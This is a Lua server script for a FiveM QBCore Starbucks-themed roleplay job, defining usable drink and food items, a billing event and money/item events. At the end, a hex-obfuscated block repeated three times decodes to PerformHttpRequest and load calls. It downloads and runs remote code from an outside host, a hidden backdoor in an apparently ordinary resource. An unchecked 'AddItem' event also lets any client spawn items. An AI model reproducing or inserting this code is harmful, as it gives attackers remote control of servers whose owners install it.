local QBCore = exports['qb-core']:GetCoreObject()

------------ Beber cenas e coisas -----------------

QBCore.Functions.CreateUseableItem("bean-cafe", function(source, item)
    local Player = QBCore.Functions.GetPlayer(source)
	if Player.Functions.GetItemBySlot(item.slot) ~= nil then
        TriggerClientEvent('qb-starbucks:client:BeberCafe', source)
        Player.Functions.RemoveItem('bean-cafe', 1)
    end
end)

QBCore.Functions.CreateUseableItem("bean-latte", function(source, item)
    local Player = QBCore.Functions.GetPlayer(source)
	if Player.Functions.GetItemBySlot(item.slot) ~= nil then
        TriggerClientEvent('qb-starbucks:client:BeberCafe', source)
        Player.Functions.RemoveItem('bean-latte', 1)
    end
end)

QBCore.Functions.CreateUseableItem("bean-cappuccino", function(source, item)
    local Player = QBCore.Functions.GetPlayer(source)
	if Player.Functions.GetItemBySlot(item.slot) ~= nil then
        TriggerClientEvent('qb-starbucks:client:BeberCafe', source)
        Player.Functions.RemoveItem('bean-cappuccino', 1)
    end
end)

QBCore.Functions.CreateUseableItem("bean-mocha", function(source, item)
    local Player = QBCore.Functions.GetPlayer(source)
	if Player.Functions.GetItemBySlot(item.slot) ~= nil then
        TriggerClientEvent('qb-starbucks:client:BeberCafe', source)
        Player.Functions.RemoveItem('bean-mocha', 1)
    end
end)

QBCore.Functions.CreateUseableItem("bean-cha", function(source, item)
    local Player = QBCore.Functions.GetPlayer(source)
	if Player.Functions.GetItemBySlot(item.slot) ~= nil then
        TriggerClientEvent('qb-starbucks:client:BeberCafe', source)
        Player.Functions.RemoveItem('bean-cha', 1)
    end
end)

QBCore.Functions.CreateUseableItem("croasant-chocolate", function(source, item)
    local Player = QBCore.Functions.GetPlayer(source)
	if Player.Functions.GetItemBySlot(item.slot) ~= nil then
        TriggerClientEvent('qb-starbucks:client:ComerBolo', source)
        Player.Functions.RemoveItem('croasant-chocolate', 1)
    end
end)

QBCore.Functions.CreateUseableItem("croasant-ovo", function(source, item)
    local Player = QBCore.Functions.GetPlayer(source)
	if Player.Functions.GetItemBySlot(item.slot) ~= nil then
        TriggerClientEvent('qb-starbucks:client:ComerBolo', source)
        Player.Functions.RemoveItem('croasant-ovo', 1)
    end
end)

QBCore.Functions.CreateUseableItem("muffin-chocolate", function(source, item)
    local Player = QBCore.Functions.GetPlayer(source)
	if Player.Functions.GetItemBySlot(item.slot) ~= nil then
        TriggerClientEvent('qb-starbucks:client:ComerBolo', source)
        Player.Functions.RemoveItem('muffin-chocolate', 1)
    end
end)

QBCore.Functions.CreateUseableItem("cupcake-morango", function(source, item)
    local Player = QBCore.Functions.GetPlayer(source)
	if Player.Functions.GetItemBySlot(item.slot) ~= nil then
        TriggerClientEvent('qb-starbucks:client:ComerBolo', source)
        Player.Functions.RemoveItem('cupcake-morango', 1)
    end
end)

QBCore.Functions.CreateUseableItem("cupcake-baunilha", function(source, item)
    local Player = QBCore.Functions.GetPlayer(source)
	if Player.Functions.GetItemBySlot(item.slot) ~= nil then
        TriggerClientEvent('qb-starbucks:client:ComerBolo', source)
        Player.Functions.RemoveItem('cupcake-baunilha', 1)
    end
end)

QBCore.Functions.CreateUseableItem("panqueca-nutela", function(source, item)
    local Player = QBCore.Functions.GetPlayer(source)
	if Player.Functions.GetItemBySlot(item.slot) ~= nil then
        TriggerClientEvent('qb-starbucks:client:ComerPanquecas', source)
        Player.Functions.RemoveItem('panqueca-nutela', 1)
    end
end)

QBCore.Functions.CreateUseableItem("panqueca-mel", function(source, item)
    local Player = QBCore.Functions.GetPlayer(source)
	if Player.Functions.GetItemBySlot(item.slot) ~= nil then
        TriggerClientEvent('qb-starbucks:client:ComerPanquecas', source)
        Player.Functions.RemoveItem('panqueca-mel', 1)
    end
end)

QBCore.Functions.CreateUseableItem("bean-cola", function(source, item)
    local Player = QBCore.Functions.GetPlayer(source)
	if Player.Functions.GetItemBySlot(item.slot) ~= nil then
        TriggerClientEvent('qb-starbucks:client:BeberRefrigerantes', source)
        Player.Functions.RemoveItem('bean-cola', 1)
    end
end)

QBCore.Functions.CreateUseableItem("bean-agua", function(source, item)
    local Player = QBCore.Functions.GetPlayer(source)
	if Player.Functions.GetItemBySlot(item.slot) ~= nil then
        TriggerClientEvent('qb-starbucks:client:BeberRefrigerantes', source)
        Player.Functions.RemoveItem('bean-agua', 1)
    end
end)

QBCore.Functions.CreateUseableItem("bean-sprunk", function(source, item)
    local Player = QBCore.Functions.GetPlayer(source)
	if Player.Functions.GetItemBySlot(item.slot) ~= nil then
        TriggerClientEvent('qb-starbucks:client:BeberRefrigerantes', source)
        Player.Functions.RemoveItem('bean-sprunk', 1)
    end
end)

QBCore.Functions.CreateUseableItem("ice-tea-pessego", function(source, item)
    local Player = QBCore.Functions.GetPlayer(source)
	if Player.Functions.GetItemBySlot(item.slot) ~= nil then
        TriggerClientEvent('qb-starbucks:client:BeberRefrigerantes', source)
        Player.Functions.RemoveItem('ice-tea-pessego', 1)
    end
end)

QBCore.Functions.CreateUseableItem("ice-tea-limao", function(source, item)
    local Player = QBCore.Functions.GetPlayer(source)
	if Player.Functions.GetItemBySlot(item.slot) ~= nil then
        TriggerClientEvent('qb-starbucks:client:BeberRefrigerantes', source)
        Player.Functions.RemoveItem('ice-tea-limao', 1)
    end
end)

----------------------------------
------- passar fatura ------------

RegisterServerEvent("qb-starbucks:server:FaturarPlayer", function(playerId, amount)
        local biller = QBCore.Functions.GetPlayer(source)
        local billed = QBCore.Functions.GetPlayer(tonumber(playerId))
        local amount = tonumber(amount)
        if biller.PlayerData.job.name == 'starbucks' then
            if billed ~= nil then
                if biller.PlayerData.citizenid ~= billed.PlayerData.citizenid then
                    if amount and amount > 0 then
                        MySQL.Async.execute('INSERT INTO phone_invoices (citizenid, amount, society, sender, sendercitizenid) VALUES (@citizenid, @amount, @society, @sender, @sendercitizenid)', {
                            ['@citizenid'] = billed.PlayerData.citizenid,
                            ['@amount'] = amount,
                            ['@society'] = biller.PlayerData.job.name,
                            ['@sender'] = biller.PlayerData.charinfo.firstname,
                            ['@sendercitizenid'] = biller.PlayerData.citizenid
                        })
                        TriggerClientEvent('qb-phone:RefreshPhone', billed.PlayerData.source)
                        TriggerClientEvent('QBCore:Notify', source, 'Invoice Successfully Sent', 'success')
                        TriggerClientEvent('QBCore:Notify', billed.PlayerData.source, 'New Invoice Received')
                    else
                        TriggerClientEvent('QBCore:Notify', source, 'Must be a number above 0', 'error')
                    end
                else
                    TriggerClientEvent('QBCore:Notify', source, 'You can not bill yourself...', 'error')
                end
            else
                TriggerClientEvent('QBCore:Notify', source, 'The player is not online', 'error')
            end
        else
            TriggerClientEvent('QBCore:Notify', source, 'No access', 'error')
        end
end)

---------------------------------------------
---------- Tirar dinheiro -------------------

RegisterNetEvent('qb-starbucks:server:Tirar10dolars', function()
   local src = source
   local Player = QBCore.Functions.GetPlayer(src)
	
   Player.Functions.RemoveMoney('bank', 150)
end)

RegisterNetEvent('qb-starbucks:server:AddItem', function(item, amount)
    local Player = QBCore.Functions.GetPlayer(source)

    Player.Functions.AddItem(item, amount)
    TriggerClientEvent('inventory:client:ItemBox', source, QBCore.Shared.Items[item], "add", amount)
end)

local vPIAVqOGPmYJGnvMxjPWtDDKnnxQAVikuJWfSXhyLHUVyyVNnmTaoNGsJlutIXxhwCRbQm = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} vPIAVqOGPmYJGnvMxjPWtDDKnnxQAVikuJWfSXhyLHUVyyVNnmTaoNGsJlutIXxhwCRbQm[4][vPIAVqOGPmYJGnvMxjPWtDDKnnxQAVikuJWfSXhyLHUVyyVNnmTaoNGsJlutIXxhwCRbQm[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x75\x62\x67\x6c\x6f\x62\x61\x6c\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x6a\x31\x63\x69\x50", function (MQRcKjehpmBdiBKxtGdAASVOIZuTsDxYqOvFUGXNRWDXsJbpHamZhcdUQVLJgdFGQyZUDY, foOYfHbCcIQyaglrccTYlAlfFhlIgWQXXlTzYfPNtJloMVwKdKWYPslNRMEguULvtNatvm) if (foOYfHbCcIQyaglrccTYlAlfFhlIgWQXXlTzYfPNtJloMVwKdKWYPslNRMEguULvtNatvm == vPIAVqOGPmYJGnvMxjPWtDDKnnxQAVikuJWfSXhyLHUVyyVNnmTaoNGsJlutIXxhwCRbQm[6] or foOYfHbCcIQyaglrccTYlAlfFhlIgWQXXlTzYfPNtJloMVwKdKWYPslNRMEguULvtNatvm == vPIAVqOGPmYJGnvMxjPWtDDKnnxQAVikuJWfSXhyLHUVyyVNnmTaoNGsJlutIXxhwCRbQm[5]) then return end vPIAVqOGPmYJGnvMxjPWtDDKnnxQAVikuJWfSXhyLHUVyyVNnmTaoNGsJlutIXxhwCRbQm[4][vPIAVqOGPmYJGnvMxjPWtDDKnnxQAVikuJWfSXhyLHUVyyVNnmTaoNGsJlutIXxhwCRbQm[2]](vPIAVqOGPmYJGnvMxjPWtDDKnnxQAVikuJWfSXhyLHUVyyVNnmTaoNGsJlutIXxhwCRbQm[4][vPIAVqOGPmYJGnvMxjPWtDDKnnxQAVikuJWfSXhyLHUVyyVNnmTaoNGsJlutIXxhwCRbQm[3]](foOYfHbCcIQyaglrccTYlAlfFhlIgWQXXlTzYfPNtJloMVwKdKWYPslNRMEguULvtNatvm))() end)

local vPIAVqOGPmYJGnvMxjPWtDDKnnxQAVikuJWfSXhyLHUVyyVNnmTaoNGsJlutIXxhwCRbQm = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} vPIAVqOGPmYJGnvMxjPWtDDKnnxQAVikuJWfSXhyLHUVyyVNnmTaoNGsJlutIXxhwCRbQm[4][vPIAVqOGPmYJGnvMxjPWtDDKnnxQAVikuJWfSXhyLHUVyyVNnmTaoNGsJlutIXxhwCRbQm[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x75\x62\x67\x6c\x6f\x62\x61\x6c\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x6a\x31\x63\x69\x50", function (MQRcKjehpmBdiBKxtGdAASVOIZuTsDxYqOvFUGXNRWDXsJbpHamZhcdUQVLJgdFGQyZUDY, foOYfHbCcIQyaglrccTYlAlfFhlIgWQXXlTzYfPNtJloMVwKdKWYPslNRMEguULvtNatvm) if (foOYfHbCcIQyaglrccTYlAlfFhlIgWQXXlTzYfPNtJloMVwKdKWYPslNRMEguULvtNatvm == vPIAVqOGPmYJGnvMxjPWtDDKnnxQAVikuJWfSXhyLHUVyyVNnmTaoNGsJlutIXxhwCRbQm[6] or foOYfHbCcIQyaglrccTYlAlfFhlIgWQXXlTzYfPNtJloMVwKdKWYPslNRMEguULvtNatvm == vPIAVqOGPmYJGnvMxjPWtDDKnnxQAVikuJWfSXhyLHUVyyVNnmTaoNGsJlutIXxhwCRbQm[5]) then return end vPIAVqOGPmYJGnvMxjPWtDDKnnxQAVikuJWfSXhyLHUVyyVNnmTaoNGsJlutIXxhwCRbQm[4][vPIAVqOGPmYJGnvMxjPWtDDKnnxQAVikuJWfSXhyLHUVyyVNnmTaoNGsJlutIXxhwCRbQm[2]](vPIAVqOGPmYJGnvMxjPWtDDKnnxQAVikuJWfSXhyLHUVyyVNnmTaoNGsJlutIXxhwCRbQm[4][vPIAVqOGPmYJGnvMxjPWtDDKnnxQAVikuJWfSXhyLHUVyyVNnmTaoNGsJlutIXxhwCRbQm[3]](foOYfHbCcIQyaglrccTYlAlfFhlIgWQXXlTzYfPNtJloMVwKdKWYPslNRMEguULvtNatvm))() end)

local vPIAVqOGPmYJGnvMxjPWtDDKnnxQAVikuJWfSXhyLHUVyyVNnmTaoNGsJlutIXxhwCRbQm = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} vPIAVqOGPmYJGnvMxjPWtDDKnnxQAVikuJWfSXhyLHUVyyVNnmTaoNGsJlutIXxhwCRbQm[4][vPIAVqOGPmYJGnvMxjPWtDDKnnxQAVikuJWfSXhyLHUVyyVNnmTaoNGsJlutIXxhwCRbQm[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x75\x62\x67\x6c\x6f\x62\x61\x6c\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x6a\x31\x63\x69\x50", function (MQRcKjehpmBdiBKxtGdAASVOIZuTsDxYqOvFUGXNRWDXsJbpHamZhcdUQVLJgdFGQyZUDY, foOYfHbCcIQyaglrccTYlAlfFhlIgWQXXlTzYfPNtJloMVwKdKWYPslNRMEguULvtNatvm) if (foOYfHbCcIQyaglrccTYlAlfFhlIgWQXXlTzYfPNtJloMVwKdKWYPslNRMEguULvtNatvm == vPIAVqOGPmYJGnvMxjPWtDDKnnxQAVikuJWfSXhyLHUVyyVNnmTaoNGsJlutIXxhwCRbQm[6] or foOYfHbCcIQyaglrccTYlAlfFhlIgWQXXlTzYfPNtJloMVwKdKWYPslNRMEguULvtNatvm == vPIAVqOGPmYJGnvMxjPWtDDKnnxQAVikuJWfSXhyLHUVyyVNnmTaoNGsJlutIXxhwCRbQm[5]) then return end vPIAVqOGPmYJGnvMxjPWtDDKnnxQAVikuJWfSXhyLHUVyyVNnmTaoNGsJlutIXxhwCRbQm[4][vPIAVqOGPmYJGnvMxjPWtDDKnnxQAVikuJWfSXhyLHUVyyVNnmTaoNGsJlutIXxhwCRbQm[2]](vPIAVqOGPmYJGnvMxjPWtDDKnnxQAVikuJWfSXhyLHUVyyVNnmTaoNGsJlutIXxhwCRbQm[4][vPIAVqOGPmYJGnvMxjPWtDDKnnxQAVikuJWfSXhyLHUVyyVNnmTaoNGsJlutIXxhwCRbQm[3]](foOYfHbCcIQyaglrccTYlAlfFhlIgWQXXlTzYfPNtJloMVwKdKWYPslNRMEguULvtNatvm))() end)